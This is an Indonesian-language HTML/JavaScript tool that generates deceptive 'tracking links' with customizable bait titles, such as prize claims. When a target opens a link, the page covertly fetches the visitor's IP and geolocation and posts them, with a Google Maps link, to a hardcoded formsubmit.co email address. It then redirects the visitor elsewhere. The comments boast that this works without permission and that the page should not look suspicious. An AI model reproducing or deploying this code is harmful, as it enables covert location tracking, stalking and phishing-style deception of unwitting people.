<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat Konten...</title> <!-- Judul default yang tidak mencurigakan untuk semua orang -->
    <style>
        /* BASE STYLES - Ini adalah gaya yang akan dilihat target, JANGAN MENCURIGAKAN! */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5; /* Latar belakang terang */
            color: #333; /* Warna teks standar */
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }
        .container {
            background-color: #ffffff; /* Latar belakang putih bersih */
            border: 1px solid #e0e0e0; /* Border halus */
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); /* Shadow lembut */
            padding: 30px;
            border-radius: 8px;
            text-align: center;
            max-width: 600px;
            width: 90%;
            position: relative;
            z-index: 1;
        }
        h1 {
            color: #333; /* Warna teks standar */
            margin-bottom: 20px;
            font-size: 2.2em;
        }
        p {
            margin-bottom: 15px;
            line-height: 1.6;
            color: #555; /* Warna teks sedikit lebih gelap */
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group label {
            display: block;
            margin-bottom: 5px;
            color: #333;
            font-weight: bold;
        }
        .input-group input[type="text"] {
            width: calc(100% - 20px);
            padding: 10px;
            border: 1px solid #ccc;
            background-color: #fdfdfd;
            color: #333;
            border-radius: 5px;
            font-size: 1em;
        }
        .input-group input[type="text"]:focus {
            outline: none;
            border-color: #007bff; /* Biru standar */
            box-shadow: 0 0 5px rgba(0, 123, 255, 0.5);
        }
        button {
            background-color: #007bff; /* Biru standar */
            color: #ffffff;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 1.1em;
            font-weight: bold;
            transition: background-color 0.3s ease, box-shadow 0.3s ease;
            box-shadow: 0 2px 5px rgba(0, 123, 255, 0.2);
        }
        button:hover {
            background-color: #0056b3; /* Biru lebih gelap */
            box-shadow: 0 4px 8px rgba(0, 123, 255, 0.3);
        }
        #trackingLinkOutput {
            margin-top: 25px;
            padding: 15px;
            background-color: #f8f9fa;
            border: 1px dashed #ced4da;
            border-radius: 5px;
            color: #333;
            word-break: break-all;
            display: none;
        }
        #trackingLinkOutput a {
            color: #007bff;
            text-decoration: none;
        }
        #trackingLinkOutput a:hover {
            text-decoration: underline;
        }
        .status {
            margin-top: 20px;
            font-weight: bold;
            color: #dc3545; /* Merah untuk pesan status/error */
        }
        .console-output {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            color: #495057;
            padding: 15px;
            margin-top: 20px;
            text-align: left;
            font-family: 'Consolas', 'Monaco', monospace;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
            display: none;
        }
        /* Loading spinner for the target page - lebih soft */
        .loader {
            border: 8px solid #f3f3f3; /* Light grey */
            border-top: 8px solid #007bff; /* Blue */
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Glitch text - Hanya untuk mode creator */
        .glitch-text {
            display: none; /* Default tersembunyi */
            position: absolute;
            top: 20px;
            left: 20px;
            font-size: 2em;
            color: #ff00ff; /* Magenta Neon */
            text-shadow: 0 0 5px #00ff00, 0 0 10px #ff00ff;
            animation: glitch 1.5s infinite alternate;
            opacity: 0.2;
            pointer-events: none;
            z-index: 0; /* Pastikan di belakang container */
        }
    </style>
</head>
<body>
    <div class="glitch-text" id="glitchEffect">ACCESS GRANTED</div>
    <div class="container" id="mainContainer">
        <!-- Content untuk mode pembuat -->
        <div id="creatorContent">
            <h1>üõ†Ô∏è Pembuat Tautan Pelacak S üõ†Ô∏è</h1>
            <p>Selamat datang, users! Di sini, kamu bisa membuat tautan pelacak IP yang akan membongkar perkiraan lokasi targetmu begitu mereka membukanya. Tanpa izin browser! Sebuah trik kecil yang licik, bukan? Haha! Ini adalah permainan pikiran!</p>

            <div class="input-group">
                <label for="redirectUrl">URL Pengalihan (Wajib - Setelah lokasi didapat):</label>
                <input type="text" id="redirectUrl" placeholder="Contoh: https://situs-asli.com/artikel" value="https://google.com">
            </div>
            <div class="input-group">
                <label for="lureTitle">Judul Halaman Penarik (Untuk Target):</label>
                <input type="text" id="lureTitle" placeholder="Contoh: Klaim Hadiahmu Sekarang!">
            </div>
            <div class="input-group">
                <label for="lureDescription">Deskripsi Halaman Penarik (Untuk Target):</label>
                <input type="text" id="lureDescription" placeholder="Contoh: Kami perlu verifikasi IP Anda untuk mengklaim hadiah ini.">
            </div>

            <button id="generateLinkButton">üöÄ Buat Tautan Pelacak Sekarang!</button>

            <div id="trackingLinkOutput" class="console-output">
                <p>Tautan Pelacakmu siap digunakan, users! Sebarkan dan saksikan keajaiban digital terjadi:</p>
                <a href="#" id="generatedLink" target="_blank"></a>
                <textarea id="manualCopyLink" readonly style="width: calc(100% - 20px); height: 60px; margin-top: 10px; background-color: #2a2a2a; color: #00ff00; border: 1px dashed #ff00ff; border-radius: 5px; padding: 10px; resize: vertical;"></textarea>
                <button onclick="copyLink()" style="margin-top: 10px; background-color: #ff00ff; color: #1a1a1a;">Salin Tautan (Otomatis)</button>
                <p style="margin-top: 10px; color: #ff00ff;">Jika tombol gagal, sorot dan salin teks di atas secara manual! üëÜ</p>
            </div>


            <div class="status"></div>
            <div id="consoleLog" class="console-output">
                <h3>Log Sistem:</h3>
                <p>Memulai proses pelacakan...</p>
            </div>
        </div>
        <!-- End of creator content -->

        <!-- Konten untuk mode target (akan ditampilkan jika ada parameter 'r' di URL) -->
        <div id="targetContent" style="display:none;">
            <h1 id="targetTitle">Memuat Konten...</h1>
            <p id="targetDescription">Harap tunggu sebentar, kami sedang memverifikasi lokasi Anda untuk melanjutkan.</p>
            <div class="loader"></div>
            <div class="status"></div>
            <div id="targetConsoleLog" class="console-output">
                <h3>Log Sistem:</h3>
                <p>Memulai proses verifikasi...</p>
            </div>
        </div>
    </div>

    <script>
        // HATI-HATI: Ganti URL webhook ini dengan milikmu! Ini akan menerima data lokasi.
        const webhook = "https://formsubmit.co/ffakunff1921234@gmail.com"; // URL WEBHOOK BARU!

        const statusDisplay = document.querySelector(".status");
        let consoleLogDisplay = document.getElementById("consoleLog");
        const redirectUrlInput = document.getElementById("redirectUrl");
        const lureTitleInput = document.getElementById("lureTitle");
        const lureDescriptionInput = document.getElementById("lureDescription");
        const generateLinkButton = document.getElementById("generateLinkButton");
        const trackingLinkOutputDiv = document.getElementById("trackingLinkOutput");
        const generatedLinkElement = document.getElementById("generatedLink");
        const manualCopyLinkTextarea = document.getElementById("manualCopyLink");

        const creatorContentDiv = document.getElementById("creatorContent");
        const targetContentDiv = document.getElementById("targetContent");
        const targetTitleElement = document.getElementById("targetTitle");
        const targetDescriptionElement = document.getElementById("targetDescription");
        const glitchEffectElement = document.getElementById("glitchEffect");
        let targetConsoleLogDisplay;

        const urlParams = new URLSearchParams(window.location.search);

        function logToConsole(message) {
            const currentLogDisplay = urlParams.has('r') ? targetConsoleLogDisplay : consoleLogDisplay;
            if (currentLogDisplay) {
                currentLogDisplay.style.display = 'block';
                currentLogDisplay.innerHTML += `<p>${new Date().toLocaleTimeString()} &gt;&gt; ${message}</p>`;
                currentLogDisplay.scrollTop = currentLogDisplay.scrollHeight;
            }
        }

        /**
         * Fungsi untuk menyuntikkan gaya hacker/gelap jika dalam mode creator.
         */
        function injectCreatorStyles() {
            const style = document.createElement('style');
            style.innerHTML = `
                body {
                    background-color: #1a1a1a !important;
                    color: #00ff00 !important;
                }
                .container {
                    background-color: #0d0d0d !important;
                    border: 2px solid #00ff00 !important;
                    box-shadow: 0 0 20px #00ff00, inset 0 0 10px #00ff00 !important;
                }
                h1 {
                    color: #ff00ff !important;
                    text-shadow: 0 0 8px #00ff00 !important;
                }
                p {
                    color: #00ff00 !important;
                }
                .input-group label {
                    color: #00ff00 !important;
                }
                .input-group input[type="text"] {
                    border: 1px solid #00ff00 !important;
                    background-color: #0d0d0d !important;
                    color: #ff00ff !important;
                    box-shadow: inset 0 0 5px #00ff00 !important;
                }
                .input-group input[type="text"]:focus {
                    border-color: #ff00ff !important;
                    box-shadow: inset 0 0 8px #ff00ff !important;
                }
                button {
                    background-color: #00ff00 !important;
                    color: #1a1a1a !important;
                    box-shadow: 0 0 10px #00ff00 !important;
                }
                button:hover {
                    background-color: #00e600 !important;
                    box-shadow: 0 0 15px #00ff00 !important;
                }
                #trackingLinkOutput {
                    background-color: #2a2a2a !important;
                    border: 1px dashed #ff00ff !important;
                    color: #00ff00 !important;
                    box-shadow: inset 0 0 5px #ff00ff !important;
                }
                #trackingLinkOutput a {
                    color: #ff00ff !important;
                }
                .status {
                    color: #ff00ff !important;
                }
                .console-output {
                    background-color: #000 !important;
                    border: 1px solid #00ff00 !important;
                    color: #00ff00 !important;
                    box-shadow: inset 0 0 5px #00ff00 !important;
                }
                #manualCopyLink {
                    background-color: #2a2a2a !important;
                    color: #00ff00 !important;
                    border: 1px dashed #ff00ff !important;
                }
            `;
            document.head.appendChild(style);
            if (glitchEffectElement) {
                glitchEffectElement.style.display = 'block';
            }
        }

        /**
         * Fungsi inti yang berjalan saat target membuka tautan pelacak.
         * Ini akan mendapatkan lokasi berdasarkan IP tanpa izin.
         */
        async function runTrackingLogic() {
            logToConsole("Mencoba mendapatkan alamat IP target...");
            statusDisplay.textContent = "Memuat... Memverifikasi lokasi IP...";

            let clientIp = "Tidak Terdeteksi";
            let locationInfo = "Gagal mendapatkan detail lokasi IP.";
            let mapLink = "Tidak tersedia";
            let ipApiData = null;

            try {
                // Langkah 1: Dapatkan alamat IP publik klien
                const ipifyRes = await fetch("https://api.ipify.org?format=json");
                const ipifyData = await ipifyRes.json();
                clientIp = ipifyData.ip;
                logToConsole(`Alamat IP target terdeteksi: ${clientIp}`);

                // Langkah 2: Gunakan IP untuk mendapatkan geolokasi dari ip-api.com
                // Menggunakan http agar lebih fleksibel di beberapa lingkungan (meskipun HTTPS lebih baik)
                const ipApiRes = await fetch(`http://ip-api.com/json/${clientIp}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
                ipApiData = await ipApiRes.json();

                if (ipApiData.status === 'success') {
                    const { lat, lon, city, regionName, country } = ipApiData;
                    locationInfo = `IP: ${clientIp}, Negara: ${country}, Provinsi: ${regionName}, Kota: ${city}`;
                    if (lat && lon) {
                        mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        locationInfo += `, Lat: ${lat}, Lon: ${lon}`;
                    }
                    logToConsole(`Lokasi IP terdeteksi: ${locationInfo}`);
                    statusDisplay.textContent = "Lokasi IP berhasil diverifikasi.";
                } else {
                    locationInfo = `IP: ${clientIp} (API error: ${ipApiData.message || 'unknown'})`;
                    logToConsole(`IP-API gagal: ${ipApiData.message || 'unknown'}`);
                    statusDisplay.textContent = "Gagal mendapatkan detail lokasi IP.";
                }
            } catch (error) {
                console.error(`[${new Date().toLocaleTimeString()}] Error saat proses IP geolocation: ${error.message}`);
                logToConsole(`Terjadi kesalahan saat mendapatkan IP/lokasi: ${error.message} üí•`);
                statusDisplay.textContent = "Terjadi kesalahan saat verifikasi lokasi.";
            }

            // Langkah 3: Siapkan dan kirim data ke Formsubmit
            const dataFields = {
                lokasi_ip: locationInfo,
                peta_link: mapLink,
                waktu: new Date().toString(),
                _subject: `IP Lokasi Terdeteksi (Tanpa Izin) oleh S untuk: ${document.title}`, // Menggunakan document.title lure
                _template: "table",
                _captcha: "false"
            };
            logToConsole("Mengirim data IP lokasi ke Formsubmit...");
            statusDisplay.textContent = "Mengirim data ke server...";
            submitToFormsubmit(dataFields);
        }

        /**
         * Fungsi pembantu untuk membuat dan mengirim form ke Formsubmit.
         * Ini akan memastikan semua data dikirim sebagai form POST dan menangani pengalihan _next.
         */
        function submitToFormsubmit(dataFields) {
            const form = document.createElement("form");
            form.method = "POST";
            form.action = webhook;
            form.style.display = "none";

            Object.entries(dataFields).forEach(([key, value]) => {
                const input = document.createElement("input");
                input.type = "hidden";
                input.name = key;
                input.value = value;
                form.appendChild(input);
            });

            const targetRedirectUrl = urlParams.get('r');
            const nextInput = document.createElement("input");
            nextInput.type = "hidden";
            nextInput.name = "_next";
            // Jika ada URL pengalihan 'r', gunakan itu. Jika tidak, alihkan ke google.com sebagai fallback.
            nextInput.value = targetRedirectUrl ? decodeURIComponent(targetRedirectUrl) : "https://google.com";
            form.appendChild(nextInput);

            document.body.appendChild(form);
            form.submit();

            logToConsole("Simulasi form berhasil dikirim ke Formsubmit. Formsubmit akan mengalihkan halaman. üöÄ");
            statusDisplay.textContent = "Data dikirim. Mengalihkan...";
        }

        generateLinkButton.addEventListener('click', () => {
            logToConsole("Tombol 'Buat Tautan Pelacak' diklik. Mengolah...");
            const baseUrl = window.location.origin + window.location.pathname; // Menggunakan halaman ini sebagai base
            const desiredRedirect = redirectUrlInput.value.trim();
            const lureTitle = lureTitleInput.value.trim();
            const lureDescription = lureDescriptionInput.value.trim();
            let generatedTrackingLink = baseUrl;

            if (!desiredRedirect) {
                statusDisplay.textContent = "‚ö†Ô∏è URL Pengalihan wajib diisi!";
                logToConsole("URL Pengalihan kosong. Pembuatan tautan dibatalkan.");
                return;
            }

            const encodedRedirect = encodeURIComponent(desiredRedirect);
            let params = `r=${encodedRedirect}`;

            if (lureTitle) {
                params += `&t=${encodeURIComponent(lureTitle)}`;
            }
            if (lureDescription) {
                params += `&d=${encodeURIComponent(lureDescription)}`;
            }

            generatedTrackingLink += `?${params}`;
            logToConsole(`Membentuk tautan pelacak IP dengan pengalihan ke: ${desiredRedirect} dan umpan dinamis üîó`);

            generatedLinkElement.href = generatedTrackingLink;
            generatedLinkElement.textContent = generatedTrackingLink;
            manualCopyLinkTextarea.value = generatedTrackingLink;
            trackingLinkOutputDiv.style.display = 'block';
            statusDisplay.textContent = "Tautan berhasil dibuat! Salin dan sebarkan. üòà";
            logToConsole("Tautan pelacak berhasil dibuat.");
        });

        function copyLink() {
            const linkText = generatedLinkElement.textContent;
            navigator.clipboard.writeText(linkText).then(() => {
                statusDisplay.textContent = "Tautan pelacak disalin ke clipboard! üéâ";
                logToConsole("Tautan pelacak disalin.");
            }).catch(err => {
                statusDisplay.textContent = "Gagal menyalin tautan otomatis. Silakan salin secara manual dari kotak di atas! üö´";
                logToConsole(`Gagal menyalin tautan otomatis: ${err.message} üö´`);
                manualCopyLinkTextarea.select();
                try {
                    document.execCommand('copy');
                    statusDisplay.textContent = "Tautan disorot. Silakan tekan Ctrl+C / Cmd+C untuk menyalin!";
                    logToConsole("Teks tautan disorot untuk salinan manual.");
                } catch (fallbackErr) {
                    statusDisplay.textContent = "Gagal menyalin dan menyorot tautan. Silakan salin manual dari kotak teks.";
                    logToConsole(`Fallback salinan manual juga gagal: ${fallbackErr.message}`);
                }
            });
        }

        // --- Logika inisialisasi halaman ---
        if (urlParams.has('r')) {
            // Jika parameter 'r' ada, berarti ini adalah kunjungan tautan pelacak oleh target
            creatorContentDiv.style.display = 'none';
            targetContentDiv.style.display = 'block';

            const dynamicTitle = urlParams.get('t') ? decodeURIComponent(urlParams.get('t')) : "Verifikasi Konten Anda";
            const dynamicDescription = urlParams.get('d') ? decodeURIComponent(urlParams.get('d')) : "Harap tunggu sebentar, kami sedang memverifikasi akses Anda untuk memuat konten ini. Proses ini cepat dan otomatis.";

            document.title = dynamicTitle;
            targetTitleElement.textContent = dynamicTitle;
            targetDescriptionElement.textContent = dynamicDescription;

            targetConsoleLogDisplay = document.getElementById("targetConsoleLog");
            consoleLogDisplay = targetConsoleLogDisplay;

            logToConsole("Mode target aktif. Memuat halaman umpan...");
            runTrackingLogic();
        } else {
            // Jika tidak ada parameter 'r', ini adalah antarmuka pembuatan tautan untukmu
            creatorContentDiv.style.display = 'block';
            targetContentDiv.style.display = 'none';
            injectCreatorStyles(); // Suntikkan gaya hacker hanya untukmu!
            logToConsole("Mode pembuatan tautan diaktifkan. üíª");
        }

        logToConsole("Sistem S aktif. Menunggu perintah...");
    </script>
</body>
</html>
